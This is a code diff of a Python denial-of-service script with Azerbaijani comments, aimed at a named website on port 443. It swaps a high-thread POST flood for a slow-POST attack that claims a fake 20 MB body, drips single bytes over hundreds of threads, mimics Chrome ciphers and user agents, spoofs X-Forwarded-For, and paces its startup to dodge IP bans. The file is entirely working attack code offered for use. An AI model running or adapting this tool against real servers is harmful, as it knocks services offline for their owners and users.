@@ -3,44 +3,80 @@ import ssl
 import threading
 import random
 import time
-import string
 import os
 
-# --- MAXIMUM OVERDRIVE ---
+# --- EXTREME TARGET ---
 TARGET_HOST = "www.appl88-vip.com"
 TARGET_PORT = 443
-THREADS = 2000 # Railway Paid plan üçün maksimal şəbəkə sıxlığı
-BATCH_SIZE = 100 # Bir bağlantıda serveri boğan asinxron dalğa
+# Çox thread IP blokuna səbəb olur, sayı azaldırıq amma keyfiyyəti artırırıq
+THREADS = 500 
 
 def r_str(n):
-    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))
+    return "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=n))
 
-def singularity_strike():
-    # SSL Handshake-i serveri deşifrə ilə daxildən yormaq üçün qururuq
+def ghost_strike():
+    # SSL Handshake-i bir brauzer (Chrome) kimi göstərmək üçün tənzimləyirik
     ctx = ssl.create_default_context()
     ctx.check_hostname = False
     ctx.verify_mode = ssl.CERT_NONE
-    # Şifrləməni ən baha başa gələn üsulda saxlayırıq ki, serverin CPU-su kilitlənsin
-    ctx.set_ciphers('DEFAULT@SECLEVEL=1')
+    # Müasir Chrome ciphers-ləri ilə serveri aldadırıq
+    ctx.set_ciphers('ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:AES128-GCM-SHA256')
 
     while True:
         try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1) # Nagle Bypass
-            s.settimeout(5)
+            # TCP bağlantısı
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            # TCP Window Size-ı çox kiçik tuturuq (Serveri bağlantı limitində boğur)
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024)
+            sock.settimeout(10)
 
-            conn = ctx.wrap_socket(s, server_hostname=TARGET_HOST)
+            # SSL bağlantısını qururuq
+            conn = ctx.wrap_socket(sock, server_hostname=TARGET_HOST)
             conn.connect((TARGET_HOST, TARGET_PORT))
 
-            # HTTP/2 Rapid Reset & Header Frame Overload təqlidi
-            # Sənaye səviyyəli "qadağan olunmuş" metod
-            for _ in range(BATCH_SIZE):
-                # Saytın daxili API və parametrlərini hədəf alırıq
-                path = f"/?v={time.time()}&id={r_str(30)}&invite_code={random.randint(1000, 9999)}"
-                
-                # Bu başlıq serveri hər sorğuda daxili yaddaş (Buffer) ayırmağa məcbur edir
-                payload = (
-                    f"POST {path} HTTP/1.1\r\n"
-                    f"Host: {TARGET_HOST}\r\n"
-                    f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/12{random.randint(0,5)}.0.0.0 Safari/537.36\r\n"
-                    f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1
+            # Serverin daxili API-lərini hədəf alırıq
+            # Bu mürəkkəb URL-lər keşlənməni bypass edir
+            params = f"v={time.time()}&id={r_str(30)}&invite_code={random.randint(1000, 9999)}"
+            
+            # Sənə dediyim o "böyük nəsə" göndərmə kəşfi burada:
+            # Content-Length-i süni olaraq 20 MB göstəririk! 
+            header = (
+                f"POST /?{params} HTTP/1.1\r\n"
+                f"Host: {TARGET_HOST}\r\n"
+                f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/12{random.randint(2,6)}.0.0.0 Safari/537.36\r\n"
+                f"Content-Type: application/x-www-form-urlencoded\r\n"
+                f"Content-Length: 20971520\r\n" # 20 Megabyte! Server dərhal RAM ayıracaq.
+                f"Connection: Keep-Alive\r\n"
+                f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}\r\n"
+                f"\r\n"
+            ).encode()
+
+            conn.sendall(header)
+
+            # İndi serveri "kilitləyirik": 
+            # Hər saniyə cəmi 1 bayt göndəririk ki, server bağlantını kəsməsin
+            for _ in range(500):
+                conn.send(b"\x00")
+                time.sleep(random.uniform(0.1, 1.0))
+
+            conn.close()
+        except Exception:
+            pass
+
+def main():
+    print(f"👻 GHOST-SYNC ARMED: {TARGET_HOST}")
+    print("[!] Targeting Origin Server Buffer & Memory Map.")
+    
+    for i in range(THREADS):
+        t = threading.Thread(target=ghost_strike)
+        t.daemon = True
+        t.start()
+        if i % 50 == 0:
+            print(f"[*] {i} Ghost-Warheads synchronized...")
+            time.sleep(1) # IP ban almasın deyə yavaş-yavaş başlayır
+
+    while True:
+        time.sleep(1)
+
+if __name__ == "__main__":
+    main()
